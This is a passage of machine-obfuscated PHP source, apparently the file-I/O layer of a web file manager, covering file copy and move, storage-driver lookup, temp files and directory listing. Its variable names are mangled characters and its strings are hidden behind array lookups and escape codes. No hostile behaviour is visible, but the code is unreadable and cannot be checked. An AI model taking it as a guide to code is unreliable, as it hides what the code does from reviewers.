$°ΗΝ™©‡ . $¨ΉΕ―[73] . $„ωθ£ξ); } } self::copyMoveKeepInfo($ΎΈ‹Λ…³, $°ΗΝ™©‡, $ΗΖμ‘Ή); return $ΗΖμ‘Ή; } private static function copyFile($Ϊ•»ν“ƒ, $ζλΥΤ, $π³ΧάΡ”, $Β¶Ιωζ, $γίμΐµ, $―©΅ϋχε) { $«ΰΊ€ΡΌ =& $_SERVER[γγάψ½]; $Β¶Ιωζ = $π³ΧάΡ”->getPath(rtrim($Β¶Ιωζ, $«ΰΊ€ΡΌ[8]) . $«ΰΊ€ΡΌ[8] . $γίμΐµ); $ν΄™ΐ–™ = $«ΰΊ€ΡΌ[1247] . time() . rand_string(5); Hook::trigger($«ΰΊ€ΡΌ[1248], $Ϊ•»ν“ƒ, $ζλΥΤ, $π³ΧάΡ”, $Β¶Ιωζ, $γίμΐµ, $ν΄™ΐ–™); if (self::driverIsSame($Ϊ•»ν“ƒ, $π³ΧάΡ”)) { if ($―©΅ϋχε) { $ύιό­« = $π³ΧάΡ”->moveFile($ζλΥΤ, $Β¶Ιωζ); } else { $ύιό­« = $π³ΧάΡ”->copyFile($ζλΥΤ, $Β¶Ιωζ); } Hook::trigger($«ΰΊ€ΡΌ[1249], $Ϊ•»ν“ƒ, $ζλΥΤ, $π³ΧάΡ”, $Β¶Ιωζ, $γίμΐµ, $ύιό­«); self::copyMoveKeepInfo($Ϊ•»ν“ƒ, $ζλΥΤ, $ύιό­«); return $ύιό­«; } $¬Ρ οΣ = TEMP_FILES; if ($GLOBALS[$«ΰΊ€ΡΌ[6]][$«ΰΊ€ΡΌ[92]][$«ΰΊ€ΡΌ[873]]) { $¬Ρ οΣ = $GLOBALS[$«ΰΊ€ΡΌ[6]][$«ΰΊ€ΡΌ[92]][$«ΰΊ€ΡΌ[873]]; } $ΚΤ© = $¬Ρ οΣ; mk_dir($ΚΤ©); $Θ΅™† = $ΚΤ© . $ν΄™ΐ–™; $¥£Π„Ι = $Θ΅™†; $Θ΅™† = $Ϊ•»ν“ƒ->download($ζλΥΤ, $Θ΅™†); $Θ΅™† = $Ϊ•»ν“ƒ->iconvApp($Θ΅™†); if (substr($Θ΅™†, strlen($¬Ρ οΣ)) == $¬Ρ οΣ) { $―©΅ϋχε = !0; } $ύιό­« = $π³ΧάΡ”->upload($Β¶Ιωζ, $Θ΅™†, $―©΅ϋχε); self::remove($¥£Π„Ι); Hook::trigger($«ΰΊ€ΡΌ[1249], $Ϊ•»ν“ƒ, $ζλΥΤ, $π³ΧάΡ”, $Β¶Ιωζ, $γίμΐµ, $ύιό­«); self::copyMoveKeepInfo($Ϊ•»ν“ƒ, $ζλΥΤ, $ύιό­«); return $ύιό­«; } private static function copyMoveKeepInfo($πΑη«ξ, $ΟΠ’Ρ‡τ, $’υΪ™³Ϋ) { if (!$’υΪ™³Ϋ) { return; } $ιΕΊν” = $πΑη«ξ->info($ΟΠ’Ρ‡τ); if (!is_array($ιΕΊν”)) { return; } IO::setModifyTime($’υΪ™³Ϋ, $ιΕΊν”[$_SERVER[γγάψ½][88]]); } public static function pathFather($‹΅ιδ®) { $®―΅„— = IO::init($‹΅ιδ®); $—«• Δ = $®―΅„—->pathFather($®―΅„—->path); return $®―΅„—->getPathOuter($—«• Δ); } public static function fileOut($φίγϊζΧ, $­ΰΧ¨§α = false, $ϋτΧ‚ϋ‘ = false, $Ο£ΗΟ = '') { $ΰλάΧ­§ = self::driverMake($φίγϊζΧ); if ($ΰλάΧ­§->isFileOutServer()) { return $ΰλάΧ­§->fileOutServer($φίγϊζΧ, $­ΰΧ¨§α, $ϋτΧ‚ϋ‘, $Ο£ΗΟ); } return $ΰλάΧ­§->fileOut($φίγϊζΧ, $­ΰΧ¨§α, $ϋτΧ‚ϋ‘, $Ο£ΗΟ); } public static function fileOutImage($§Όδς, $θίΞ• θ = 250) { $μƒΣΫ = array(250, 600, 1200, 2000, 3000, 5000); for ($„ΆνƒήΌ = 0; $„ΆνƒήΌ < count($μƒΣΫ); $„ΆνƒήΌ++) { if ($„ΆνƒήΌ == 0 && $θίΞ• θ <= $μƒΣΫ[$„ΆνƒήΌ]) { $θίΞ• θ = $μƒΣΫ[$„ΆνƒήΌ]; break; } else { if ($θίΞ• θ > $μƒΣΫ[$„ΆνƒήΌ - 1] && $θίΞ• θ <= $μƒΣΫ[$„ΆνƒήΌ]) { $θίΞ• θ = $μƒΣΫ[$„ΆνƒήΌ]; break; } else { if ($„ΆνƒήΌ == count($μƒΣΫ) - 1 && $θίΞ• θ > $μƒΣΫ[$„ΆνƒήΌ]) { $θίΞ• θ = $μƒΣΫ[$„ΆνƒήΌ]; break; } } } } $ώ²¶Ώ΄Ϋ = self::driverMake($§Όδς); if ($ώ²¶Ώ΄Ϋ->isFileOutServer()) { return $ώ²¶Ώ΄Ϋ->fileOutImageServer($§Όδς, $θίΞ• θ); } return $ώ²¶Ώ΄Ϋ->fileOutImage($§Όδς, $θίΞ• θ); } private static function driverIsSame($¦Ί—Γώ, $ήλΟςΡƒ) { $ΰΒ¦ύΑξ =& $_SERVER[γγάψ½]; $γ›ϋ§³ = $¦Ί—Γώ->getType(); $γ¨­ΤΡΉ = $ήλΟςΡƒ->getType(); if ($γ›ϋ§³ != $γ¨­ΤΡΉ) { return !1; } if ($γ›ϋ§³ == $ΰΒ¦ύΑξ[832]) { return !0; } if ($γ›ϋ§³ == $ΰΒ¦ύΑξ[109]) { return !0; } if ($¦Ί—Γώ->pathDriver == $ήλΟςΡƒ->pathDriver) { return !0; } return !1; } public static function copyUpdate($Ϋ“άάπ, $ζΈ·“Ο) { $ςήΛξ =& $_SERVER[γγάψ½]; if (!IO::exist($Ϋ“άάπ)) { return !1; } if (!IO::exist($ζΈ·“Ο)) { IO::mkdir($ζΈ·“Ο); } $οΖΦ¶Ή = array_to_keyvalue(self::listAllSimple($Ϋ“άάπ), $ςήΛξ[87]); $οΞ– = array_to_keyvalue(self::listAllSimple($ζΈ·“Ο), $ςήΛξ[87]); $½’ΤΊ = array(); $υ¤¥—Πζ = array(); foreach ($οΖΦ¶Ή as $ƒ²Ϊ›ΰ => $ΑσΕ’°) { if (isset($οΞ–[$ƒ²Ϊ›ΰ])) { if ($ΑσΕ’°[$ςήΛξ[78]] == 1) { continue; } if ($οΞ–[$ƒ²Ϊ›ΰ][$ςήΛξ[79]] == $ΑσΕ’°[$ςήΛξ[79]]) { continue; } } if ($ΑσΕ’°[$ςήΛξ[78]] == 1) { $υ¤¥—Πζ[] = $ζΈ·“Ο . $ςήΛξ[8] . trim($ƒ²Ϊ›ΰ, $ςήΛξ[8]); continue; } $£Έχ„Ν› = strstr(trim($ƒ²Ϊ›ΰ, $ςήΛξ[8]), $ςήΛξ[8]) ? get_path_father($ƒ²Ϊ›ΰ) : $ςήΛξ[12]; $½’ΤΊ[] = array($ςήΛξ[1250] => $ΑσΕ’°[$ςήΛξ[89]], $ςήΛξ[1251] => rtrim($ζΈ·“Ο, $ςήΛξ[8]) . $ςήΛξ[8] . $£Έχ„Ν›, $ςήΛξ[1252] => $ΑσΕ’°); } $αΎθι« = array($ςήΛξ[233] => $½’ΤΊ, $ςήΛξ[78] => $υ¤¥—Πζ); Hook::trigger($ςήΛξ[1253], $Ϋ“άάπ, $ζΈ·“Ο, $αΎθι«); foreach ($υ¤¥—Πζ as $ΑσΕ’°) { IO::mkdir($ΑσΕ’°); } foreach ($½’ΤΊ as $ΑσΕ’°) { IO::copy($ΑσΕ’°[$ςήΛξ[1250]], $ΑσΕ’°[$ςήΛξ[1251]], REPEAT_REPLACE); } } public static function fileSubstr($ ϋώ, $…¬§Τ„ϊ, $ΠΧ¤υΠ = false) { $Υ•ΈƒΩ =& $_SERVER[γγάψ½]; $ΦΒ΄½“ = self::driverMake($ ϋώ); $άΠηΓ®• = $ΦΒ΄½“->size($ ϋώ); $’αΖΆό = $…¬§Τ„ϊ; $΄”¨‹¤ = $ΠΧ¤υΠ; if ($…¬§Τ„ϊ < 0) { $…¬§Τ„ϊ = $άΠηΓ®• + $…¬§Τ„ϊ; } if ($ΠΧ¤υΠ === !1) { $ΠΧ¤υΠ = $άΠηΓ®• - $…¬§Τ„ϊ; } if ($…¬§Τ„ϊ + $ΠΧ¤υΠ > $άΠηΓ®•) { $ΠΧ¤υΠ = $άΠηΓ®• - $…¬§Τ„ϊ; } if (!$άΠηΓ®• && $ΦΒ΄½“->getType() == $Υ•ΈƒΩ[109] && !$ΦΒ΄½“->exist($ ϋώ)) { $‰¨»μΟ³ = get_path_this($ ϋώ); $†ΣΚτΛψ = parse_url_query($‰¨»μΟ³); if (is_array($†ΣΚτΛψ) && isset($†ΣΚτΛψ[$Υ•ΈƒΩ[32]])) { $‰¨»μΟ³ = urldecode($†ΣΚτΛψ[$Υ•ΈƒΩ[32]]); } throw new Exception($Υ•ΈƒΩ[1254] . LNG($Υ•ΈƒΩ[1255]) . $Υ•ΈƒΩ[1052] . clear_html($‰¨»μΟ³) . $Υ•ΈƒΩ[12]); } if ($ΠΧ¤υΠ <= 0) { return $Υ•ΈƒΩ[12]; } if ($…¬§Τ„ϊ < 0 || $…¬§Τ„ϊ >= $άΠηΓ®• || $ΠΧ¤υΠ > $GLOBALS[$Υ•ΈƒΩ[6]][$Υ•ΈƒΩ[92]][$Υ•ΈƒΩ[1256]]) { throw new Exception("\146\151\154\x65\x52\145\x61\x64\40\145\x72\162\157\162\x2c\157\x76\145\x72\40\151\x6f\122\145\141\x64\115\141\170\41\40\163\x74\x61\x72\164\75{$…¬§Τ„ϊ}\73\x6c\x65\x6e\x67\164\x68\75{$ΠΧ¤υΠ}\x3b\x20\x73\151\172\x65\x3d{$άΠηΓ®•}\73"); } $™Υ‡ό = $ΦΒ΄½“->fileSubstr($ ϋώ, $…¬§Τ„ϊ, $ΠΧ¤υΠ); if (!$™Υ‡ό && $ΠΧ¤υΠ && isset($GLOBALS[$Υ•ΈƒΩ[1257]])) { throw new Exception($GLOBALS[$Υ•ΈƒΩ[1257]][$Υ•ΈƒΩ[1258]]); } return $™Υ‡ό; } private static function driverMake(&$…­¬ΊΗ) { $όϋΧ“δ =& $_SERVER[γγάψ½]; $΄›”ϋ = KodIO::parse($…­¬ΊΗ); if (!self::$driverListSystem) { $ΥΔγΉ = Model($όϋΧ“δ[842])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($ΥΔγΉ, $όϋΧ“δ[478]); } if ($΄›”ϋ[$όϋΧ“δ[33]] == KodIO::KOD_IO && !self::$driverListSystem[$΄›”ϋ[$όϋΧ“δ[478]]]) { throw new Exception($όϋΧ“δ[1259]); return !1; } $…­¬ΊΗ = $΄›”ϋ[$όϋΧ“δ[1260]]; $Λλυ²φ¥ = self::driverGet($΄›”ϋ, $…­¬ΊΗ); return $Λλυ²φ¥; } private static function driverGet($¬µΌΧν, &$»έ…υ§φ) { $¦Ίμ™΅¦ =& $_SERVER[γγάψ½]; $ύβεϋΡ = $¬µΌΧν[$¦Ίμ™΅¦[1261]]; $ξωΰΊ€ = $¬µΌΧν[$¦Ίμ™΅¦[478]]; switch ($¬µΌΧν[$¦Ίμ™΅¦[33]]) { case KodIO::KOD_IO: $ξΜώΏ¤¦ = self::$driverListSystem[$ξωΰΊ€]; break; case KodIO::KOD_SOURCE: $»έ…υ§φ = $ξωΰΊ€ . $»έ…υ§φ; $ξΜώΏ¤¦ = array($¦Ίμ™΅¦[1262] => $¦Ίμ™΅¦[1263], $¦Ίμ™΅¦[6] => $¬µΌΧν); $ξΜώΏ¤¦[$¦Ίμ™΅¦[6]][$¦Ίμ™΅¦[1264]] = $¬µΌΧν[$¦Ίμ™΅¦[478]]; break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $„¤΄”έ± = $GLOBALS[$¦Ίμ™΅¦[1265]]; self::$driverListUser = array_to_keyvalue($„¤΄”έ±, $¦Ίμ™΅¦[478]); } $ξΜώΏ¤¦ = self::$driverListUser[$ξωΰΊ€]; break; case KodIO::KOD_SHARE_LINK: $ξΜώΏ¤¦ = array($¦Ίμ™΅¦[1262] => $¦Ίμ™΅¦[1266], $¦Ίμ™΅¦[6] => $¬µΌΧν); $–ά€¦α½ = Action($¦Ίμ™΅¦[1267])->sharePathInfo($¬µΌΧν[$¦Ίμ™΅¦[87]]); $»έ…υ§φ = $–ά€¦α½[$¦Ίμ™΅¦[194]]; if (!$–ά€¦α½[$¦Ίμ™΅¦[194]]) { $ƒ†Ρ‚ = Model($¦Ίμ™΅¦[672])->getInfo($–ά€¦α½[$¦Ίμ™΅¦[673]]); $»έ…υ§φ = KodIO::clear($ƒ†Ρ‚[$¦Ίμ™΅¦[1268]] . $¬µΌΧν[$¦Ίμ™΅¦[1260]]); $¬µΌΧν[$¦Ίμ™΅¦[565]] = $ƒ†Ρ‚; $¬µΌΧν[$¦Ίμ™΅¦[1241]] = $»έ…υ§φ; $ξΜώΏ¤¦ = array($¦Ίμ™΅¦[1262] => $¦Ίμ™΅¦[1269], $¦Ίμ™΅¦[6] => $¬µΌΧν); } else { $ξΜώΏ¤¦[$¦Ίμ™΅¦[6]][$¦Ίμ™΅¦[1264]] = $–ά€¦α½[$¦Ίμ™΅¦[194]]; } break; case KodIO::KOD_SHARE_ITEM: $ξΜώΏ¤¦ = array($¦Ίμ™΅¦[1262] => $¦Ίμ™΅¦[1270], $¦Ίμ™΅¦[6] => $¬µΌΧν); $ƒ†Ρ‚ = Model($¦Ίμ™΅¦[672])->getInfo($¬µΌΧν[$¦Ίμ™΅¦[478]]); if ($ƒ†Ρ‚[$¦Ίμ™΅¦[194]] == $¦Ίμ™΅¦[231]) { $»έ…υ§φ = KodIO::clear($ƒ†Ρ‚[$¦Ίμ™΅¦[1268]] . $¬µΌΧν[$¦Ίμ™΅¦[1260]]); $¬µΌΧν[$¦Ίμ™΅¦[565]] = $ƒ†Ρ‚; $¬µΌΧν[$¦Ίμ™΅¦[1241]] = $»έ…υ§φ; $ξΜώΏ¤¦ = array($¦Ίμ™΅¦[1262] => $¦Ίμ™΅¦[1271], $¦Ίμ™΅¦[6] => $¬µΌΧν); } else { if (!$»έ…υ§φ) { $»έ…υ§φ = $ƒ†Ρ‚[$¦Ίμ™΅¦[194]]; } $ξΜώΏ¤¦[$¦Ίμ™΅¦[6]][$¦Ίμ™΅¦[1264]] = $ƒ†Ρ‚[$¦Ίμ™΅¦[194]]; } break; default: $»έ…υ§φ = $¬µΌΧν[$¦Ίμ™΅¦[87]]; $ξΜώΏ¤¦ = array($¦Ίμ™΅¦[1262] => $¦Ίμ™΅¦[1272]); break; } $αώΊκΖ = $¬µΌΧν[$¦Ίμ™΅¦[87]]; if (!isset(self::$driverCache[$αώΊκΖ])) { $›ιΉΐΕ = strtolower($ξΜώΏ¤¦[$¦Ίμ™΅¦[98]]); $›ΣΧεΘ = $GLOBALS[$¦Ίμ™΅¦[6]][$¦Ίμ™΅¦[92]][$¦Ίμ™΅¦[906]]; $²ƒΏΰ§Έ = $¦Ίμ™΅¦[77] . (isset($›ΣΧεΘ[$›ιΉΐΕ]) ? $›ΣΧεΘ[$›ιΉΐΕ] : ucfirst($›ιΉΐΕ)); if (!class_exists($²ƒΏΰ§Έ)) { show_json("{$²ƒΏΰ§Έ}\x20\156\x6f\x74\x20\x65\x78\x69\163\164\163\x21", !1); } $ΏΥΙ±ΆΉ = isset($ξΜώΏ¤¦[$¦Ίμ™΅¦[6]]) ? $ξΜώΏ¤¦[$¦Ίμ™΅¦[6]] : !1; self::$driverCache[$αώΊκΖ] = new $²ƒΏΰ§Έ($ΏΥΙ±ΆΉ); } $ΗΜόύ“έ = self::$driverCache[$αώΊκΖ]; $ΗΜόύ“έ->pathDriver = $ύβεϋΡ; $ΗΜόύ“έ->pathBase = $¦Ίμ™΅¦[12]; if (isset($ξΜώΏ¤¦[$¦Ίμ™΅¦[6]][$¦Ίμ™΅¦[1273]])) { $ΗΜόύ“έ->pathBase = rtrim($ξΜώΏ¤¦[$¦Ίμ™΅¦[6]][$¦Ίμ™΅¦[1273]], $¦Ίμ™΅¦[8]) . $¦Ίμ™΅¦[8]; $»έ…υ§φ = $ΗΜόύ“έ->pathBase . ltrim($»έ…υ§φ, $¦Ίμ™΅¦[8]); } $»έ…υ§φ = $ΗΜόύ“έ->getPath($»έ…υ§φ); if (isset($¬µΌΧν[$¦Ίμ™΅¦[1241]])) { $»έ…υ§φ = $¬µΌΧν[$¦Ίμ™΅¦[1241]]; } $ΗΜόύ“έ->path = $»έ…υ§φ; return $ΗΜόύ“έ; } public static function errorTips($Άµ·ΧΎ = false) { $γφΣ΅ =& $_SERVER[γγάψ½]; static $…ο‚Ώμ‹ = array(); $‰£Υ²σ = 1000; if ($Άµ·ΧΎ === -1) { return $…ο‚Ώμ‹ ? $…ο‚Ώμ‹[count($…ο‚Ώμ‹) - 1] : $γφΣ΅[12]; } if ($Άµ·ΧΎ === !1) { return implode($γφΣ΅[288], $…ο‚Ώμ‹); } if (count($…ο‚Ώμ‹) >= $‰£Υ²σ) { $…ο‚Ώμ‹ = array_slice($…ο‚Ώμ‹, $‰£Υ²σ * 0.5, $‰£Υ²σ); } $…ο‚Ώμ‹[] = $Άµ·ΧΎ; write_log($γφΣ΅[176] . ACTION . $γφΣ΅[1274] . $Άµ·ΧΎ, $γφΣ΅[1275]); } public static function getLastError($¬ζζΕΗ = '') { $Ε‘΅ΉΎ = self::errorTips(-1); return $Ε‘΅ΉΎ ? $Ε‘΅ΉΎ : $¬ζζΕΗ; } } goto D£§ ΅Βσ; CζγΣ‡΅Θ³: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $¬θΓσΛ =& $_SERVER[γγάψ½]; $this->objectDriver = array($¬θΓσΛ[60], $¬θΓσΛ[61], $¬θΓσΛ[62], $¬θΓσΛ[63], $¬θΓσΛ[64], $¬θΓσΛ[65], $¬θΓσΛ[66], $¬θΓσΛ[67], $¬θΓσΛ[68], $¬θΓσΛ[69], $¬θΓσΛ[70], $¬θΓσΛ[71]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($άιέΙ) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($άιέΙ, $_SERVER[γγάψ½][8]); } return $άιέΙ; } public function iconvApp($μΝΚ¶ά) { return $μΝΚ¶ά; } public function iconvSystem($ΉΗητψ…) { return $ΉΗητψ…; } public function iconvTo($―Ζ¶ΘΧ¥, $ Ω¨ΉΊΪ, $»“†®Ώ–) { $ΤΎ³­ΞΫ =& $_SERVER[γγάψ½]; if (!$―Ζ¶ΘΧ¥ || !function_exists($ΤΎ³­ΞΫ[72])) { return $―Ζ¶ΘΧ¥; } static $Α·υ†Φ = array(); $¬ΝαιΌι = $ Ω¨ΉΊΪ . $ΤΎ³­ΞΫ[73] . $»“†®Ώ– . $ΤΎ³­ΞΫ[74] . $―Ζ¶ΘΧ¥; if (isset($Α·υ†Φ[$¬ΝαιΌι])) { return $Α·υ†Φ[$¬ΝαιΌι]; } if (function_exists($ΤΎ³­ΞΫ[75])) { $»¦Ώ¥Ε = @mb_convert_encoding($―Ζ¶ΘΧ¥, $»“†®Ώ–, $ Ω¨ΉΊΪ); } else { $»¦Ώ¥Ε = @iconv($ Ω¨ΉΊΪ, $»“†®Ώ–, $―Ζ¶ΘΧ¥); } $»¦Ώ¥Ε = $»¦Ώ¥Ε ? $»¦Ώ¥Ε : $―Ζ¶ΘΧ¥; if (strstr($»¦Ώ¥Ε, $ΤΎ³­ΞΫ[76])) { $»¦Ώ¥Ε = str_replace($ΤΎ³­ΞΫ[76], $ΤΎ³­ΞΫ[11], $»¦Ώ¥Ε); } $Α·υ†Φ[$ Ω¨ΉΊΪ . $ΤΎ³­ΞΫ[73] . $»“†®Ώ– . $ΤΎ³­ΞΫ[74] . $―Ζ¶ΘΧ¥] = $»¦Ώ¥Ε; $Α·υ†Φ[$»“†®Ώ– . $ΤΎ³­ΞΫ[73] . $ Ω¨ΉΊΪ . $ΤΎ³­ΞΫ[74] . $―Ζ¶ΘΧ¥] = $―Ζ¶ΘΧ¥; $Α·υ†Φ[$»“†®Ώ– . $ΤΎ³­ΞΫ[73] . $ Ω¨ΉΊΪ . $ΤΎ³­ΞΫ[74] . $»¦Ώ¥Ε] = $―Ζ¶ΘΧ¥; $Α·υ†Φ[$ Ω¨ΉΊΪ . $ΤΎ³­ΞΫ[73] . $»“†®Ώ– . $ΤΎ³­ΞΫ[74] . $»¦Ώ¥Ε] = $»¦Ώ¥Ε; return $»¦Ώ¥Ε; } public function getPathInner($νζΦΆ) { $σ©‡ή¥¤ = IO::init($νζΦΆ); return $σ©‡ή¥¤->path; } public function getPathOuter($ƒ¶Β) { $―‡ΰσΜ =& $_SERVER[γγάψ½]; $π‰ψπάΆ = strlen(trim($this->pathBase, $―‡ΰσΜ[8])); $ƒ¶Β = substr(trim($ƒ¶Β, $―‡ΰσΜ[8]), $π‰ψπάΆ); return $this->pathDriver . $―‡ΰσΜ[8] . ltrim($ƒ¶Β, $―‡ΰσΜ[8]); } public function isParentOf($’”³†Κ¥, $Έ“κςππ) { $Ϊ™Ωαη¥ =& $_SERVER[γγάψ½]; $’”³†Κ¥ = rtrim(strtolower($’”³†Κ¥), $Ϊ™Ωαη¥[8]) . $Ϊ™Ωαη¥[8]; $Έ“κςππ = rtrim(strtolower($Έ“κςππ), $Ϊ™Ωαη¥[8]) . $Ϊ™Ωαη¥[8]; $½±£δΨ = strpos($Έ“κςππ, $’”³†Κ¥) === 0; return $½±£δΨ; } public function getType() { $η»¦ΥΟ© =& $_SERVER[γγάψ½]; $βΡ¶„δµ = str_replace($η»¦ΥΟ©[77], $η»¦ΥΟ©[12], get_class($this)); return strtolower($βΡ¶„δµ); } public function isOsDriver() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($Ϊ£Βρώ, $αόχ’“) { $“νΚ–χ =& $_SERVER[γγάψ½]; $Όΐ³„α = rtrim($Ϊ£Βρώ, $“νΚ–χ[8]) . $“νΚ–χ[8] . $αόχ’“; $„οφ΄Β = $this->exist($Όΐ³„α); return $„οφ΄Β ? $Όΐ³„α : !1; } public function setModifyTime($ω™¥­ί, $ρζ›Ηομ = '') { } public function renameObject($Εΐρό·—, $΅Ο‹ υ) { $ΈΰΒτμ© = $΅Ο‹ υ; $Εΐρό·— = $this->getPathOuter($Εΐρό·—); $΅Ο‹ υ = $this->pathFather($Εΐρό·—) . $΅Ο‹ υ; $–Δω†ιΔ = IO::copy($Εΐρό·—, $this->pathFather($Εΐρό·—), REPEAT_RENAME_FOLDER, $ΈΰΒτμ©); if ($–Δω†ιΔ) { IO::remove($Εΐρό·—); } return $–Δω†ιΔ ? $΅Ο‹ υ : !1; } public function tempFile($δό¶Ψοκ = '', $Εκ¤Τ = '') { if (!$δό¶Ψοκ) { $δό¶Ψοκ = rand_string(15); } $γξΎθσ = TEMP_FILES . rand_string(15) . $_SERVER[γγάψ½][8]; @mkdir($γξΎθσ, DEFAULT_PERRMISSIONS, !0); $θ²ύƒ¶° = $γξΎθσ . $δό¶Ψοκ; @touch($θ²ύƒ¶°); if ($Εκ¤Τ) { file_put_contents($θ²ύƒ¶°, $Εκ¤Τ); } return $θ²ύƒ¶°; } public function tempFileRemve($™υΥ’Ν³) { @unlink($™υΥ’Ν³); @rmdir($this->pathFather($™υΥ’Ν³)); } public function mkfile($ϋάε‘μ, $§»¤· = '', $‚³χ¶έ = REPEAT_RENAME) { } public function mkdir($®µσπω, $²λχέ = REPEAT_SKIP) { } public function delFile($Ρ»“Ζΐπ) { } public function delFolder($€ΰο΄®§) { } public function copyFile($«†ξΡκ, $„ά―ΎΈ) { } public function moveFile($ΥΟυ™Ξ, $•®¥”ΘΜ) { } public function remove($­γ½ΔΨέ) { if ($this->isFile($­γ½ΔΨέ)) { return $this->delFile($­γ½ΔΨέ); } return $this->delFolder($­γ½ΔΨέ); } public function rename($ΉθΎ΅±, $¶»―€•έ) { } public function exist($ΓΟ³Ϊ΄) { } public function findByHash($ά€¦ι = '', $‰ίΙΏ = '') { return !1; } public function isFile($Υ«Ω„­ε) { } public function isFolder($οΖ·Ί¶―) { } public function size($Ύ½„¨ψ†) { } public function info($°‰Ν¨) { } public function infoSimple($§Θ¥έ¶) { return $this->info($§Θ¥έ¶); } public function infoAuth($Ώ§τϋƒ) { return $this->info($Ώ§τϋƒ); } public function infoFull($’ΌΑωΠΫ) { return $this->info($’ΌΑωΠΫ); } public function infoFullSimple($‘κ¬ψΏ) { return $this->info($‘κ¬ψΏ); } public function infoWithChildren($αψγ–Χσ) { $μΨ’Νηµ =& $_SERVER[γγάψ½]; static $ΪΖ•έΦα = array(); if (isset($ΪΖ•έΦα[$αψγ–Χσ])) { return $ΪΖ•έΦα[$αψγ–Χσ]; } $΄Λγ®Ι = $this->info($αψγ–Χσ); if ($΄Λγ®Ι && $΄Λγ®Ι[$μΨ’Νηµ[33]] == $μΨ’Νηµ[78]) { $€·―Χη = array($μΨ’Νηµ[79] => 0, $μΨ’Νηµ[80] => 0, $μΨ’Νηµ[81] => 0); $this->infoChildren($αψγ–Χσ, $€·―Χη); $΄Λγ®Ι[$μΨ’Νηµ[79]] = $€·―Χη[$μΨ’Νηµ[79]]; $΄Λγ®Ι[$μΨ’Νηµ[82]] = array($μΨ’Νηµ[83] => $€·―Χη[$μΨ’Νηµ[80]], $μΨ’Νηµ[84] => $€·―Χη[$μΨ’Νηµ[81]]); $ΪΖ•έΦα[$αψγ–Χσ] = $΄Λγ®Ι; } return $΄Λγ®Ι; } public function listPath($πΕΔψΥΰ, $ΚνΣΠ― = false) { } public function has($α·αλΪ, $ΐ“ΔΣΡ“ = false, $ιΒο“Ί΄ = false) { } public function canRead($”‰θ) { } public function canWrite($•υ΅ι€) { } public function getContent($Εχβ…¬) { } public function setContent($•Ώ‰£, $τ°χΨΤ¥ = '') { } protected function infoChildren($«λ“Όψ, &$―Ά’Ξ±Φ) { $γΈ”°ΐχ =& $_SERVER[γγάψ½]; check_abort_echo(); $Ή°ΰϊΈ€ = $this->listPath($«λ“Όψ, !0); $Ή°ΰϊΈ€ = array_merge($Ή°ΰϊΈ€[$γΈ”°ΐχ[85]], $Ή°ΰϊΈ€[$γΈ”°ΐχ[86]]); foreach ($Ή°ΰϊΈ€ as $Μ‘ψώ…Κ) { if ($Μ‘ψώ…Κ[$γΈ”°ΐχ[33]] == $γΈ”°ΐχ[78]) { $―Ά’Ξ±Φ[$γΈ”°ΐχ[81]]++; $ §‹ΠΥΨ = $this->getPathInner($Μ‘ψώ…Κ[$γΈ”°ΐχ[87]]); $this->infoChildren($ §‹ΠΥΨ, $―Ά’Ξ±Φ); } else { $―Ά’Ξ±Φ[$γΈ”°ΐχ[80]]++; $―Ά’Ξ±Φ[$γΈ”°ΐχ[79]] += $Μ‘ψώ…Κ[$γΈ”°ΐχ[79]]; } } } public function fileSubstr($ά½¨•λΨ, $§ο™Ο¥Ϋ, $ΈδΞ•) { } public function listAll($Χ¶ΟΆ™) { } public function listAllMake($ΫόίΤ›Ά, &$®ΎΫ“έΰ) { $Τ―ζφδ΅ =& $_SERVER[γγάψ½]; check_abort_echo(); $Ώ«΄ΆΨ = $this->listPath($ΫόίΤ›Ά, !0); if (!$Ώ«΄ΆΨ) { return; } $Ι΅‘”ώΔ = array_merge($Ώ«΄ΆΨ[$Τ―ζφδ΅[85]], $Ώ«΄ΆΨ[$Τ―ζφδ΅[86]]); foreach ($Ι΅‘”ώΔ as $λΊόΆΏώ) { $›…™ΣΚΰ = $λΊόΆΏώ[$Τ―ζφδ΅[33]] == $Τ―ζφδ΅[78]; $ΠΜΨνρΟ = array($Τ―ζφδ΅[87] => $λΊόΆΏώ[$Τ―ζφδ΅[87]], $Τ―ζφδ΅[78] => $›…™ΣΚΰ); if (isset($λΊόΆΏώ[$Τ―ζφδ΅[79]])) { $ΠΜΨνρΟ[$Τ―ζφδ΅[79]] = $λΊόΆΏώ[$Τ―ζφδ΅[79]]; } if (isset($λΊόΆΏώ[$Τ―ζφδ΅[88]])) { $ΠΜΨνρΟ[$Τ―ζφδ΅[88]] = $λΊόΆΏώ[$Τ―ζφδ΅[88]]; } if (!$›…™ΣΚΰ) { $®ΎΫ“έΰ[] = $ΠΜΨνρΟ; continue; } $®ΎΫ“έΰ[] = $ΠΜΨνρΟ; $Χ“Νά = $λΊόΆΏώ[$Τ―ζφδ΅[87]]; $ϋδΊ–±Ή = $this->pathDriver; if (substr($λΊόΆΏώ[$Τ―ζφδ΅[87]], 0, strlen($ϋδΊ–±Ή)) == $ϋδΊ–±Ή) { $Χ“Νά = substr($Χ“Νά, strlen($ϋδΊ–±Ή)); } $this->listAllMake($Χ“Νά, $®ΎΫ“έΰ); } } public function listAllSimple($†‹ΌΗ€, $ψΎ¦ψ·Β = false) { $Ύ­ΟΤυ = $this->listAll($†‹ΌΗ€); return $this->listAllSimpleMake($Ύ­ΟΤυ, $this->getPathOuter($†‹ΌΗ€), $ψΎ¦ψ·Β); } public function listAllSimpleMake($Α¬΄, $΅‘Δέπ, $’ΰά·) { $δκ·ωμ =& $_SERVER[γγάψ½]; $¨«ρ† = array(); $΅‘Δέπ = rtrim(get_path_father($΅‘Δέπ), $δκ·ωμ[8]) . $δκ·ωμ[8]; foreach ($Α¬΄ as $‘Ηί‘ώΨ) { $¶½ξςΒο = array($δκ·ωμ[87] => $‘Ηί‘ώΨ[$δκ·ωμ[87]], $δκ·ωμ[89] => $‘Ηί‘ώΨ[$δκ·ωμ[87]], $δκ·ωμ[78] => $‘Ηί‘ώΨ[$δκ·ωμ[78]]); if (isset($‘Ηί‘ώΨ[$δκ·ωμ[79]]) && 